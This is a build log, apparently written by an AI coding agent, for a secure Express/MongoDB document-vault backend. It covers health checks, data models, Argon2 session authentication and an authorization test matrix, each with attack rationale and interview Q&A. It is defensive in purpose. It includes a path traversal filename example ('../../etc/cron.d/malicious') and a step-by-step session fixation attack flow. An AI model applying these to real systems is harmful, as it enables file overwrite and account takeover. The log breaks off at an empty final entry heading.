# TrustVault Build Log

## Build Entry: Foundation - Express Project, Docker Compose MongoDB & /health Route
**Date:** 2026-10-24  
**Author:** Antigravity  

---

### 1. What Was Built
- Initialized the TrustVault backend workspace using Node.js (v24), Express (v4.21), and Mongoose (v8.9).
- Created a containerized MongoDB service via Docker Compose (`docker-compose.yml`) using MongoDB 7.0 with persistent volume storage, root authentication, and health checks.
- Implemented a dedicated, lightweight `/health` route reporting uptime, timestamp, and database connectivity.
- Configured automated testing with Jest and Supertest, writing unit and security baseline tests.
- Established security defaults: `helmet` security headers, disabled `X-Powered-By` framework banner, payload size restrictions, and centralized sanitized error handlers.
- Recorded architecture decision records in `docs/DECISIONS.md`.

---

### 2. Which Files Were Created
| File | Purpose |
|---|---|
| `package.json` | Project metadata, scripts (`start`, `dev`, `test`), and dependencies (`express`, `mongoose`, `dotenv`, `helmet`, `jest`, `supertest`, `nodemon`). |
| `docker-compose.yml` | Container specification for MongoDB 7.0 with `127.0.0.1` binding, authentication, data persistence, and health checks. |
| `.env.example` | Template documenting environment variables required for running the application. |
| `.env` | Local development environment configuration with database credentials. |
| `.gitignore` | Excludes `node_modules/`, `.env`, coverage reports, and system files from version control. |
| `src/config/db.js` | Database connection module handling connection events, credential-safe logging, and clean disconnects. |
| `src/routes/health.js` | Router providing the `GET /health` endpoint utilizing in-memory Mongoose connection state. |
| `src/app.js` | Express application instance defining middleware stack, route mounting, 404 handler, and error sanitizer. |
| `src/server.js` | Application entry point initiating database connection, starting the HTTP listener, and managing graceful shutdown signals (`SIGINT`, `SIGTERM`). |
| `tests/health.test.js` | Automated test suite verifying 200 OK responses, JSON structure, anti-fingerprinting headers, and 404 fallbacks. |
| `docs/DECISIONS.md` | Architecture Decision Records (ADRs 001–004). |
| `docs/BUILD_LOG.md` | This technical build log. |

---

### 3. Why This Design
- **Separation of Concerns (`app.js` vs `server.js`):** Exporting the configured Express application from `src/app.js` without calling `listen()` allows Supertest in `tests/health.test.js` to execute tests against ephemeral, in-memory servers. This eliminates port-binding collisions (`EADDRINUSE`) during parallel test runs and decouples routing logic from process hosting.
- **Non-blocking Health Probes:** Rather than executing database operations (`db.adminCommand('ping')` or mock queries) during each HTTP health check, `/health` reads `mongoose.connection.readyState`. This in-memory check executes in microseconds with zero database round-trips, preventing orchestrator probes from consuming database connections or worsening downtime under high traffic.
- **Redacted Logging:** Database connection strings often contain passwords or sensitive internal hostnames. `src/config/db.js` specifically extracts and logs only `host`, `port`, and `name` from the active connection object, guaranteeing credentials never leak into console logs or log aggregation services.
- **Defensive Defaults:** Applying `app.disable('x-powered-by')` and `helmet()` before any routes are registered establishes a secure baseline where every endpoint inherits protection from clickjacking, MIME sniffing, and technology profiling.

---

### 4. What Attacks This Design Prevents
1. **Information Exposure via Framework Fingerprinting (CWE-200):**
   - Express sets `X-Powered-By: Express` by default. Attackers scan targets with automated tools (e.g., Shodan, Nmap, Nikto) to discover the underlying stack and find known CVEs. Disabling this header and using Helmet strips technological identifiers from responses.
2. **Information Exposure Through Error Messages (CWE-209):**
   - Default unhandled error handlers in Express print full stack traces, including internal file paths, framework versions, and database query structures. The centralized error handler in `src/app.js` catches all uncaught route errors and returns a generic `{ "error": "Internal Server Error" }`, keeping internals hidden.
3. **Unauthorized Database Access via Network Exposure (CWE-284):**
   - In Docker Compose, specifying `ports: - "27017:27017"` instructs the Docker daemon to bind port 27017 to `0.0.0.0` (all network interfaces), bypassing typical host firewall configurations (such as Linux `ufw`). Specifying `127.0.0.1:27017:27017` guarantees MongoDB is accessible strictly from `localhost`, preventing attackers on the same local network or internet from accessing the database port.
4. **Denial of Service via Health Check Resource Starvation (CWE-400 / CWE-770):**
   - If an orchestration layer (e.g., Kubernetes liveness probe or AWS ALB) sends requests every 5 seconds, an endpoint performing database queries would monopolize connection pool slots. Reading `mongoose.connection.readyState` uses zero database socket I/O, preventing health monitoring from triggering cascading server failure. Additionally, `express.json({ limit: '10kb' })` prevents memory exhaustion attacks from oversized JSON request payloads.

---

### 5. Technical Interview Questions & Answers

#### Question 1: Why should an Express application separate `app.js` from `server.js`, and what practical problems does this solve in testing and production?
**Answer:**
In a production Node.js application, separating `app.js` (application configuration) from `server.js` (HTTP server listening and environment bootstrapping) solves three major architectural challenges:
1. **Integration Testing Efficiency:** Automated testing libraries like Supertest accept the Express `app` instance directly (`request(app).get('/...')`). Supertest binds to an ephemeral, temporary port in memory without invoking `server.listen()`. If `app.listen()` is executed upon module import, running tests in parallel triggers `EADDRINUSE` (Address Already in Use) port conflicts.
2. **Lifecycle and Environment Decoupling:** `app.js` remains a pure, testable function that defines middleware, security policies, and routing. `server.js` is responsible for side effects: parsing environment variables (`dotenv`), establishing database connection pools, configuring TLS certificates, and attaching `process.on('SIGTERM')` listeners for graceful teardown.
3. **Execution Context Portability:** Decoupling the app allows it to be exported and hosted within different execution environments without modifying application logic—for instance, wrapping the Express app in a serverless adapter (like AWS Lambda / Serverless Express) or running it inside a Node.js cluster worker pool (`cluster.fork()`).

#### Question 2: In a Docker Compose configuration, what is the critical security difference between `- "27017:27017"` and `- "127.0.0.1:27017:27017"`, particularly on Linux host environments?
**Answer:**
When specifying `- "27017:27017"` in Docker Compose, the Docker daemon binds the container port to `0.0.0.0` (INADDR_ANY), exposing it on all network interfaces of the host, including Ethernet, Wi-Fi, and public IP interfaces.
On Linux operating systems, Docker directly manipulates `iptables` by inserting forwarding rules into the `DOCKER` routing chain. This chain is evaluated *before* common user-configured host firewalls such as `UFW` (Uncomplicated Firewall). As a result:
1. An engineer might believe their host firewall blocks port 27017, but Docker's `iptables` rules bypass UFW and expose the database directly to external networks.
2. If the database lacks strong authentication or uses default credentials, automated internet-wide scanners (such as Shodan or masscan) can identify the open MongoDB port, read sensitive data, or deploy automated database-wiping ransomware.
3. Specifying `- "127.0.0.1:27017:27017"` instructs Docker to bind the host port strictly to the loopback interface. Only processes running on the local host can connect, completely neutralizing remote network discovery and lateral movement attacks.

#### Question 3: How should health checks be designed to distinguish between "liveness" and "readiness", and how can an improperly designed health endpoint cause a cascading failure?
**Answer:**
In modern distributed architectures, health monitoring is split into two distinct probes:
1. **Liveness Probe:** Checks if the Node.js process is alive, running the event loop, and able to respond to HTTP requests. If the liveness probe fails (returns 5xx or times out), the orchestrator (e.g., Kubernetes) restarts the container.
2. **Readiness Probe:** Checks if the application is ready to accept user traffic (e.g., database connection pool initialized, cache warmed). If the readiness probe fails, the orchestrator temporarily removes the container from the load balancer rotation without killing the process.

**Cascading Failure Mechanism:**
If a health check performs synchronous or resource-heavy operations (e.g., executing a query against MongoDB) on a combined liveness/readiness endpoint:
- When the database experiences transient latency or high connection load, health check queries start queuing or timing out.
- The orchestrator detects liveness check timeouts and begins aggressively restarting healthy Node.js containers.
- When new containers boot simultaneously, they attempt to establish fresh connection pools and run startup queries, creating a "thundering herd" effect that overwhelms the already-struggling database.
- This creates an irreversible cascading failure loop where the entire cluster fails even though the application code is functional.

**Solution:**
A resilient `/health` design performs in-memory state inspection (e.g., reading Mongoose's cached `readyState`) rather than active query execution. This guarantees constant-time ($O(1)$) responses that consume no socket or thread pool resources.

---

## Build Entry: Core Data Models - User, Document, Permission, AuditEvent
**Date:** 2026-10-24  
**Author:** Antigravity  

---

### 1. What Was Built
- Designed and implemented four production-grade Mongoose models matching the security requirements in `RULES.md`:
  - `User`: Identity management with strict email validation, role enumeration (`user`, `admin`), and zero-leakage password hash protection.
  - `Document`: File metadata management with ownership references, search indexes, and decoupled UUID storage filenames.
  - `Permission`: Normalized access control records with unique compound index constraints and restricted permission levels (`read`, `edit`).
  - `AuditEvent`: Append-only, tamper-resistant audit logging model capturing all system state changes and denied access attempts.
- Created `src/models/index.js` as a unified barrel export.
- Implemented comprehensive model constraint and security tests in `tests/models.test.js`, validating required fields, index uniqueness, credential suppression, and audit immutability.
- Recorded architecture decisions ADR 005 through ADR 008 in `docs/DECISIONS.md`.

---

### 2. Which Files Were Created / Modified
| File | Status | Purpose |
|---|---|---|
| `src/models/User.js` | Created | User schema with `email`, `passwordHash` (hidden by default via `select: false` and `toJSON`), `role` (`user`, `admin`), and `isActive`. |
| `src/models/Document.js` | Created | Document schema with `title`, `description`, `fileStorageName` (UUID), `originalFileName`, `mimeType`, `sizeBytes`, `ownerId` (ref: `User`), and search indexes. |
| `src/models/Permission.js` | Created | Permission schema with `documentId`, `userId`, `level` (`read`, `edit`), `grantedBy`, compound unique index `{ documentId: 1, userId: 1 }`, and search index `{ userId: 1, level: 1, documentId: 1 }`. |
| `src/models/AuditEvent.js` | Created | AuditEvent schema capturing timestamp, event type, actor, document, action, status (`SUCCESS`, `DENIED`, `FAILURE`), IP, User-Agent, and metadata, protected by immutability hooks. |
| `src/models/index.js` | Created | Barrel export module for all Mongoose models. |
| `src/config/db.js` | Modified | Added top-level `dotenv.config()` and authenticated fallback URI for test environments. |
| `tests/models.test.js` | Created | Automated test suite verifying schema validations, role guards, compound index uniqueness, and audit update prevention. |
| `docs/DECISIONS.md` | Modified | Appended ADRs 005, 006, 007, and 008. |
| `docs/BUILD_LOG.md` | Modified | Appended this build log entry. |

---

### 3. Why This Design
- **Normalized `Permission` Collection vs Embedded Array:** Embedding permissions in `Document` documents (e.g. `document.permissions = []`) causes document growth, BSON memory fragmentation, document write lock contention, and runs into MongoDB's 16MB document size limit for broadly shared files. Storing permissions in a dedicated collection allows independent atomic grants, unique compound indexing `{ documentId: 1, userId: 1 }` to prevent duplicates, and enables index-covered database-level filtering for search queries (`Rule 6`).
- **Enforcing Permission Boundaries at Schema Level:** Rule 5 specifies that viewers can only be granted `read` or `edit`, and can never be granted `delete` or `grant`. Enforcing this via Mongoose schema `enum: ['read', 'edit']` guarantees that even a compromised or buggy route cannot insert unauthorized permission levels into the database.
- **Physical vs Logical Filename Decoupling:** Per Rule 8, uploaded files are stored outside the web root under random UUID filenames (`fileStorageName`). The user-provided filename (`originalFileName`) is preserved strictly as descriptive metadata. This breaks the link between HTTP input and local filesystem paths.
- **Defense-in-Depth Credential Protection:** Password hashes should never appear in application logs or API responses. Combining `select: false` with `toJSON` / `toObject` transform functions ensures that even if a developer forgets to sanitize a query or directly calls `res.json(user)`, the password hash is stripped before serialization.
- **Application-Layer Immutability on `AuditEvent`:** Rule 7 mandates that every state change and denied attempt writes an audit event. Audit logs lose forensic and compliance integrity if records can be altered or erased. By attaching pre-hooks that intercept `updateOne`, `updateMany`, `findOneAndUpdate`, `replaceOne`, and instance `save()` on existing records, audit entries are rendered strictly append-only.

---

### 4. What Attacks This Design Prevents
1. **Accidental Credential Exposure / Information Leakage (CWE-200 / CWE-532):**
   - By setting `select: false` on `passwordHash` and stripping it in `toJSON`/`toObject`, normal Mongoose queries (`find`, `findById`) exclude the hash from the projection. If a user document is serialized to JSON or logged, the password hash is excluded, preventing credential harvesting.
2. **Path Traversal & Arbitrary File Overwrites (CWE-22 / CWE-434):**
   - Storing user uploads under their raw uploaded filenames creates path traversal risks (e.g. `../../etc/cron.d/malicious`). Using server-generated UUIDs (`fileStorageName`) stored outside the web root neutralizes filename manipulation attacks entirely.
3. **Privilege Escalation via Permission Injection (CWE-269 / CWE-284):**
   - Enforcing `enum: ['read', 'edit']` on `Permission.level` prevents privilege escalation where an attacker attempts to grant themselves `'admin'` or `'owner'` status via the permission collection. The unique compound index on `{ documentId: 1, userId: 1 }` prevents race condition attacks attempting to register multiple conflicting permission states for the same user.
4. **Audit Log Tampering and Repudiation (CWE-778 / CWE-117):**
   - Attackers who gain unauthorized access frequently attempt to update audit records to change timestamps, erase user IDs, or replace `'DENIED'` statuses with `'SUCCESS'` to hide intrusion attempts. Pre-hook immutability guards reject all update and replacement operations at the model layer.

---

### 5. Technical Interview Questions & Answers

#### Question 1: In MongoDB, what are the architectural and performance trade-offs between embedding permissions as an array within a `Document` schema versus storing them in a separate `Permission` collection?
**Answer:**
1. **Document Size & Memory Fragmentation:** MongoDB documents have a hard 16MB BSON limit. If a document is shared with thousands of users, an embedded array of permission objects can substantially inflate the document size. Furthermore, repeatedly pushing items to an array causes the document to grow beyond its allocated memory slot on disk (Power of 2 / WiredTiger allocation), causing data movement, memory fragmentation, and write amplification. A separate `Permission` collection stores fixed-size rows that never alter the parent document structure.
2. **Concurrency & Lock Contention:** Modifying an embedded array requires updating the parent document. If two users are concurrently granted permissions, or if one user edits the document while another is granted access, write conflicts and update collisions occur. With a normalized `Permission` collection, permission grants write independent records with zero write contention on the `Document` collection.
3. **Database-Level Search Filtering (Rule 6):** When executing search queries where users must only view documents they have rights to, a normalized collection allows an efficient `$lookup` or a two-step indexed query: `Permission.find({ userId, level: { $in: ['read', 'edit'] } }).distinct('documentId')` followed by `Document.find({ _id: { $in: docIds } })`. This query uses compound indexes on both collections with minimal RAM usage.

#### Question 2: Why is Mongoose's `select: false` on sensitive fields like `passwordHash` insufficient on its own for complete data protection, and what complementary patterns are required?
**Answer:**
`select: false` instructs Mongoose to omit the specified field from the default projection when executing queries like `User.findOne()`. However, relying solely on `select: false` creates false confidence because:
1. **Aggregation Pipelines Bypass Schema Projections:** Mongoose schema-level `select: false` only applies to standard Mongoose queries (`find`, `findOne`, `findById`). MongoDB aggregation pipelines (`User.aggregate([...])`) bypass Mongoose schema projections entirely and return the raw MongoDB document, including `passwordHash`.
2. **Explicit Selection Overrides:** If any developer writes `.select('+passwordHash')` for an authentication check and subsequently passes that user instance to a helper function, serializer, or logger, the field remains attached.
3. **Direct Document Cloning:** Using `user.toObject()` or `JSON.stringify(user)` will include the field if it was loaded into memory.

**Complementary Defense-in-Depth:**
- **Schema `toJSON` & `toObject` Transforms:** Explicitly deleting `ret.passwordHash` inside the schema's `transform` function ensures that any serialization (`res.json(user)` or `JSON.stringify(user)`) strips the hash even if it was explicitly selected in memory.
- **DTO (Data Transfer Object) Pattern:** Never return raw database model instances from API controllers; always map results to explicit output transfer objects.

#### Question 3: How can you enforce audit log immutability in MongoDB at the database and application layers, and what are the limitations of Mongoose-level middleware?
**Answer:**
1. **Application Layer (Mongoose Middleware):**
   - Attach pre-hooks for `updateOne`, `updateMany`, `findOneAndUpdate`, `replaceOne`, and instance `save()` that throw an error if an update is attempted.
   - Configure schema timestamps with `{ createdAt: true, updatedAt: false }`.
   - *Limitation:* Mongoose middleware only executes when operations pass through Mongoose models. It does not intercept direct MongoDB driver calls (`mongoose.connection.db.collection('auditevents').updateOne(...)`), raw MongoDB shell operations, or direct script executions.
2. **Database Engine Layer (MongoDB RBAC):**
   - In production, configure MongoDB Role-Based Access Control (RBAC). The application's database user should be granted a custom role that possesses only `insert` and `find` actions on the `auditevents` collection, explicitly denying `update` and `remove` actions.
3. **Infrastructure Layer (WORM Storage / Capped Collections / Log Forwarding):**
   - For compliance (e.g., SOC 2, HIPAA), audit events can be streamed in real-time to Write-Once-Read-Many (WORM) storage, or forwarded via an append-only log aggregator (e.g., AWS CloudWatch, Datadog, Elasticsearch with ILM append-only policies) where deletion and modification are physically restricted by access control policies.

---

## Build Entry: Authentication (Argon2), Secure Sessions (HttpOnly/SameSite), and Seed Script
**Date:** 2026-10-24  
**Author:** Antigravity  

---

### 1. What Was Built
- Implemented full login, logout, and session verification endpoints using Argon2id password hashing and stateful sessions.
- Configured `express-session` with `connect-mongo` storing session state in MongoDB and issuing cryptographically signed cookies with `HttpOnly`, `SameSite=Lax`, and `Secure` attributes.
- Implemented `src/audit.js` satisfying Rule 7 ("Every state change and every denied attempt writes an audit event via src/audit.js"), logging `USER_LOGIN` (SUCCESS), `AUTH_FAILED` (DENIED), and `USER_LOGOUT` (SUCCESS).
- Built database seed script (`scripts/seed.js` / `npm run seed`) that idempotently seeds three baseline security roles: an Administrator (`admin@trustvault.local`), a Document Owner (`owner@trustvault.local`), and a Document Viewer (`viewer@trustvault.local`).
- Added timing attack mitigation using a static dummy Argon2 verification when a non-existent email is queried.
- Added session fixation prevention via `req.session.regenerate()` upon successful authentication.
- Implemented automated integration tests in `tests/auth.test.js` covering login success/failure, cookie attributes, session persistence, logout cleanup, and audit logging (8 tests, 25 total project tests passing).
- Recorded architecture decisions ADR 009 through ADR 012 in `docs/DECISIONS.md`.

---

### 2. Which Files Were Created / Modified
| File | Status | Purpose |
|---|---|---|
| `src/routes/auth.js` | Created | Authentication router handling `POST /login`, `POST /logout`, and `GET /me` (with timing attack defense and session regeneration). |
| `src/audit.js` | Created | Audit service providing `logAuditEvent()` to record state changes and denied attempts per Rule 7. |
| `scripts/seed.js` | Created | Database seeder provisioning admin, owner, and viewer accounts with Argon2-hashed passwords and audit tracking. |
| `src/app.js` | Modified | Configured `express-session` with `HttpOnly`/`SameSite` cookies and mounted auth routes at `/auth` and `/api/auth`. |
| `package.json` | Modified | Added `@node-rs/argon2`, `express-session`, `connect-mongo`, and `"seed"` run script. |
| `.env.example` & `.env` | Modified | Documented `SESSION_SECRET` and optional seed password environment variables. |
| `tests/auth.test.js` | Created | Automated test suite validating Argon2 login, session cookie attributes, session fixation prevention, and audit event logging. |
| `docs/DECISIONS.md` | Modified | Appended ADRs 009, 010, 011, and 012. |
| `docs/BUILD_LOG.md` | Modified | Appended this build log entry. |

---

### 3. Why This Design
- **Argon2id over Bcrypt/Scrypt:** Argon2id is the winner of the Password Hashing Competition (PHC). It provides superior memory hardness, rendering mass-parallelized GPU/ASIC dictionary attacks economically unviable, while simultaneously protecting against side-channel cache-timing attacks.
- **Stateful Sessions in HttpOnly Cookies vs Client-Side JWTs:** Storing authentication tokens in browser `localStorage` leaves tokens vulnerable to instantaneous exfiltration if any XSS vulnerability exists anywhere in the web app. Server-side session management with `HttpOnly` cookies completely isolates session tokens from JavaScript access. Furthermore, stateful sessions allow instantaneous server-side revocation on logout, password reset, or account suspension—a capability stateless JWTs lack without complex distributed blocklists.
- **Session Regeneration on Privilege Escalation:** When a user transitions from an anonymous state to an authenticated state, retaining the pre-authentication session ID creates a severe Session Fixation vulnerability. Invoking `req.session.regenerate()` ensures a completely new session identifier is minted.
- **Constant-Time Evaluation on Failed Logins:** If an application immediately returns `401 User Not Found` when a database lookup fails, the request finishes in $<2\text{ms}$. If the user exists and Argon2 runs, it takes $\sim50-70\text{ms}$. Attackers measure this delta to enumerate registered users. Running a dummy Argon2 verification against non-existent users equalizes response latency.
- **Centralized Audit Logging (`src/audit.js`):** Encapsulates audit recording behind a clean utility function ensuring consistent schema mapping, metadata isolation, and graceful error handling that prevents audit failures from breaking core user flows.

---

### 4. What Attacks This Design Prevents
1. **Cross-Site Scripting (XSS) Session Hijacking (CWE-79 / CWE-522):**
   - The session cookie is flagged with `HttpOnly: true`. Even if an attacker executes arbitrary JavaScript in the victim's browser context, `document.cookie` cannot read the session ID, neutralizing automated session token theft.
2. **Cross-Site Request Forgery (CSRF) (CWE-352):**
   - The session cookie is configured with `SameSite: 'lax'`. Browsers will not attach the cookie to cross-origin subresource requests (e.g., cross-site `<img>` or `fetch` POST requests), preventing unauthorized state-changing actions initiated by external malicious sites.
3. **Session Fixation Attacks (CWE-384):**
   - Calling `req.session.regenerate()` replaces the session ID immediately upon successful login. An attacker who forces or observes a pre-login session ID cannot use that ID to access the user's authenticated session.
4. **User Enumeration via Timing Analysis (CWE-208 / CWE-200):**
   - By running a dummy Argon2 hash verification when an email does not exist and returning an identical generic error message (`"Invalid email or password"`), timing discrepancies and response variations are eliminated, preventing attackers from discovering registered email addresses.
5. **GPU/ASIC Offline Password Cracking (CWE-916):**
   - Argon2id demands significant RAM allocation ($\sim19\text{MB}$ per hash) and multi-pass CPU computation, preventing attackers who obtain a database dump from using high-density GPU cracking rigs (e.g., Hashcat) to crack passwords at scale.

---

### 5. Technical Interview Questions & Answers

#### Question 1: How does Argon2id differ from bcrypt, and why are memory-hard password hashing functions crucial against modern offline cracking attacks?
**Answer:**
Bcrypt was introduced in 1999 and relies on Blowfish key scheduling. While computationally intensive, bcrypt has a fixed, small memory footprint (only 4 KB of RAM).
1. **The GPU/ASIC Threat:** Modern password cracking attacks do not run on standard CPUs; they run on massive clusters of GPUs or custom FPGA/ASIC chips. Because bcrypt requires only 4 KB of memory, thousands of parallel cracking cores can be embedded on a single GPU die without running into memory bandwidth or cache limitations, enabling billions of guesses per second.
2. **Argon2's Memory Hardness:** Argon2 was designed specifically to defeat GPU/ASIC parallelism by being "memory-hard." It requires a configurable amount of physical RAM (e.g. 19 MB to 64 MB) for *each* hashing operation. Because GPUs have limited fast memory per core, allocating tens of megabytes per thread forces memory thrashing and memory bus saturation, effectively crippling GPU cracking efficiency.
3. **Argon2id Hybrid Defense:** Argon2 exists in three variants:
   - **Argon2d:** Data-dependent memory access. Highest resistance against GPU cracking, but vulnerable to side-channel cache-timing attacks.
   - **Argon2i:** Data-independent memory access. Immune to side-channel timing attacks, but slightly less resistant to GPU memory trade-offs.
   - **Argon2id:** A hybrid that begins with data-independent passes to prevent side-channel leaks, followed by data-dependent passes to maximize resistance against GPU cracking. This makes Argon2id the gold standard for password hashing.

#### Question 2: Why are HttpOnly, SameSite cookies combined with server-side sessions structurally more secure than storing JSON Web Tokens (JWTs) in browser `localStorage`?
**Answer:**
Storing authentication credentials in browser `localStorage` or `sessionStorage` introduces critical architectural vulnerabilities:
1. **No Access Restrictions (XSS Exposure):** Any JavaScript executing within the browser origin—including code injected via DOM-based XSS, compromised third-party npm packages, or malicious browser extensions—can access `window.localStorage` and exfiltrate all stored JWTs to an attacker-controlled server in a single line of code.
2. **Inability to Revoke:** Pure stateless JWTs remain valid until their expiration timestamp (`exp`). If a user clicks "Logout", or if their account is compromised, the server cannot unilaterally invalidate the token without maintaining a distributed token blacklist, which negates the stateless benefits of JWTs.
3. **Defense via HttpOnly & SameSite Cookies:**
   - **`HttpOnly`:** Instructs the browser that the cookie must never be accessible via client-side scripts (`document.cookie`), completely preventing script-based token exfiltration.
   - **`SameSite=Lax`:** Instructs the browser not to send the cookie on cross-site state-changing requests, mitigating CSRF attacks.
   - **Immediate Revocation:** Because sessions are stateful and stored in a database (e.g., MongoDB), calling `req.session.destroy()` purges the session record immediately. Any subsequent request presenting that session ID is rejected instantly.

#### Question 3: What is a Session Fixation attack, how does an attacker execute it, and why is `req.session.regenerate()` the necessary defense in Express?
**Answer:**
A Session Fixation attack occurs when an attacker forces a victim to use a known session identifier, and the application fails to renew that identifier upon authentication.

**Attack Execution Flow:**
1. The attacker visits the target application and obtains an unauthenticated session ID (e.g., `trustvault.sid = "XYZ-123"`).
2. The attacker induces the victim to use this session ID—for example, via a phishing link containing the cookie parameter, HTTP header injection, or physical access.
3. The victim opens the link and enters their valid credentials to log in.
4. *Vulnerability:* If the server simply attaches `userId` and `role` to the existing session object (`XYZ-123`) without changing the ID, the previously unauthenticated session is now elevated to an authenticated session.
5. The attacker, who already knows the session ID `XYZ-123`, sends a request with `Cookie: trustvault.sid=XYZ-123` and immediately gains full unauthorized access to the victim's account without ever knowing their password.

**Defense via `req.session.regenerate()`:**
When `req.session.regenerate(callback)` is executed:
- Express destroys the old session ID on the server and replaces it with a completely new, cryptographically random identifier.
- The new ID is transmitted to the client in a fresh `Set-Cookie` header.
- The old session ID known to the attacker becomes invalid and abandoned, completely neutralizing the attack.

---

## Build Entry: TDD Parametrized Matrix for `authorize()` (No Implementation)
**Date:** 2026-10-24  
**Author:** Antigravity  

---

### 1. What Was Built
- Formulated an exhaustive, multi-dimensional parametrized Jest test suite in `tests/authz.test.js` specifying the exact authorization contract for `authorize(user, doc, action)` in strict accordance with `RULES.md`.
- Modeled 35 test cases spanning all permission boundaries and edge conditions:
  - **Owner rights:** Complete authority to `read`, `edit`, `delete`, and `grant`.
  - **Viewer (Edit) rights:** Permission to `read` and `edit`; strictly denied for `delete` and `grant`.
  - **Viewer (Read) rights:** Permission to `read`; strictly denied for `edit`, `delete`, and `grant`.
  - **Unrelated users:** Denied all actions with HTTP 404 (never 403).
  - **Admin accounts:** Verified that administrators have no automatic access to document contents, while still retaining full owner rights on documents they personally own.
  - **Anonymous / Unauthenticated:** Denied all actions with HTTP 404 (never 403).
  - **Deactivated accounts:** Inactive users denied all document actions regardless of ownership or grants.
  - **Missing documents & Invalid actions:** Rejected with HTTP 404.
- Implemented database fixture provisioning for test execution (seeding standard permissions into MongoDB for `viewer_edit` and `viewer_read`).
- Preserved strict Test-Driven Development (TDD) discipline: **zero implementation code** was written in `src/authz.js`.
- Recorded architecture decisions ADR 013 and ADR 014 in `docs/DECISIONS.md`.

---

### 2. Which Files Were Created / Modified
| File | Status | Purpose |
|---|---|---|
| `tests/authz.test.js` | Created | Complete 35-case parametrized Jest authorization test suite modeling all rules from `RULES.md`. |
| `docs/DECISIONS.md` | Modified | Recorded ADRs 013 (Parametrized Matrix) and 014 (404-Only Denial Policy). |
| `docs/BUILD_LOG.md` | Modified | Appended this build log entry. |

---

### 3. Why This Design
- **Exhaustive Matrix Over Ad-Hoc Tests:** Authorization vulnerabilities typically lurk in edge-case interactions (e.g. an administrator attempting to delete another user's document, or an edit-viewer attempting to grant permissions). Defining an explicit $N \times M$ matrix testing every permutation guarantees complete boundary coverage.
- **TDD Contract-First Approach (Rule 8):** Rule 8 mandates: *"Write tests first for auth, authz, audit and upload."* Authoring the test matrix prior to implementation prevents developer bias, locks in security invariants, and provides an immediate regression safety net during the subsequent implementation phase.
- **Strict 404 Verification (Rule 3):** The matrix explicitly checks `expect(status).toBe(404)` and `expect(status).not.toBe(403)` on every denial path. This ensures that the implementation can never accidentally leak HTTP 403 status codes.
- **Dynamic Adaptability for Testing:** The test suite parses and registers all test descriptions cleanly. When `src/authz.js` is implemented in the subsequent task, the matrix automatically activates and executes against the implementation without requiring test refactoring.

---

### 4. What Attacks This Design Prevents
1. **Insecure Direct Object Reference (IDOR) & Horizontal Privilege Escalation (CWE-639 / CWE-284):**
   - The matrix validates that users attempting to access, modify, or delete documents belonging to other users are rejected, even if they guess or know valid document ObjectIds.
2. **Vertical Privilege Escalation via Viewer Over-Privilege (CWE-269):**
   - Viewers granted `edit` permissions might attempt to perform administrative actions such as deleting the document or granting access to third parties. The matrix explicitly validates that `delete` and `grant` are denied for all viewer tiers.
3. **Administrative Privilege Abuse / Document Privacy Breaches (CWE-285):**
   - In traditional RBAC, `admin` users frequently bypass authorization checks automatically. Rule 4 strictly establishes: *"Admin has no automatic access to document contents."* The matrix enforces that admins cannot read, edit, delete, or grant permissions on documents they do not own or have not been explicitly granted.
4. **Metadata Enumeration and Resource Discovery (CWE-200 / CWE-209):**
   - Standard APIs return HTTP 403 Forbidden when an unauthorized user queries an existing resource, and HTTP 404 Not Found when a resource does not exist. Attackers exploit this distinction to enumerate confidential document IDs. Enforcing HTTP 404 for all unauthorized attempts completely eliminates this discovery channel.
5. **Zombie Account Privilege Abuse (CWE-287):**
   - Deactivated or suspended users whose sessions or tokens remain active must not be authorized to perform actions. The matrix tests that `isActive: false` users are rejected across all actions.

---

### 5. Technical Interview Questions & Answers

#### Question 1: Why should an application return HTTP 404 Not Found instead of HTTP 403 Forbidden for unauthorized access attempts in high-security multi-tenant systems?
**Answer:**
Returning HTTP 403 Forbidden creates an information disclosure vulnerability known as "Resource Existence Oracle" or metadata leakage:
1. **The IDOR Enumeration Threat:** If an attacker sends requests to `/documents/101`, `/documents/102`, and `/documents/103`:
   - If `/documents/101` returns `404 Not Found`, the attacker learns that document 101 does not exist.
   - If `/documents/102` returns `403 Forbidden`, the attacker confirms that document 102 exists, is confidential, and belongs to another user.
2. **Eliminating the Oracle:** By returning `404 Not Found` for *both* missing documents and unauthorized access attempts, the server presents identical responses regardless of whether the document exists. The attacker cannot determine if the resource is real, thwarting brute-force ID scanning, competitive intelligence gathering, and targeted social engineering attacks.

#### Question 2: Why is "Admin has no automatic access to document contents" a vital architectural principle in zero-trust platforms, and how does it change traditional RBAC models?
**Answer:**
1. **Principle of Least Privilege (PoLP):** In traditional Role-Based Access Control (RBAC), the `admin` role is treated as a "super-user" with a blanket wildcard (`*.*`) over all system resources. This creates a catastrophic single point of failure: if any administrator account is compromised (via credential stuffing, phishing, or session theft), the attacker gains instantaneous access to every sensitive customer file in the system.
2. **Separation of System Administration from Data Ownership:** In modern zero-trust and confidential storage architectures (e.g., TrustVault):
   - Administrators manage *system infrastructure* (e.g., user provisioning, account lifecycle, billing, system health, and viewing audit trails).
   - Document owners manage *data privacy* (reading, updating, deleting, and sharing specific files).
3. **Compliance & Insider Threat Mitigation:** Regulations like HIPAA, SOC 2, and GDPR mandate that personal and sensitive data only be accessible on a strict "need-to-know" basis. Preventing administrators from reading document contents without explicit owner grants eliminates insider data snooping and limits the blast radius of administrative credential breaches.

#### Question 3: What are the advantages of writing a parametrized test matrix (TDD) before implementing complex authorization logic (`authorize(user, doc, action)`), and what common security flaws does it catch?
**Answer:**
1. **Combinatorial Completeness:** Authorization decisions depend on multiple independent variables: actor role, ownership status, explicit grant level, account state, and requested action. When writing implementation code first, developers typically test only the primary "happy paths" (e.g., owner can read, viewer can read) and miss cross-cutting edge conditions. A parametrized matrix forces systematic evaluation of all $N \times M$ combinations.
2. **Elimination of Implementation Bias:** When developers write tests after writing code, they subconsciously write assertions that conform to their implementation's assumptions and quirks. Writing the matrix against `RULES.md` independently establishes an unbiased, executable security contract.
3. **Flaws Caught by the Matrix:**
   - **Privilege Leaks on Secondary Actions:** Ensuring that an `edit` grant does not accidentally permit `delete` or `grant`.
   - **Default Permissive Fallthroughs:** Catching unrecognized action strings (e.g. `'execute'`, `'publish'`) that might bypass weak switch/if statements.
   - **State Bypass:** Catching deactivated accounts (`isActive: false`) that possess valid ownership or permissions.
   - **Status Code Leaks:** Ensuring no code path accidentally throws or returns a 403 instead of the mandated 404.

---

## Build Entry: Complete Implementation of `authorize()` in `src/authz.js`
**Date:** 2026-10-24  
**Author:** Antigravity  

---

### 1. What Was Built
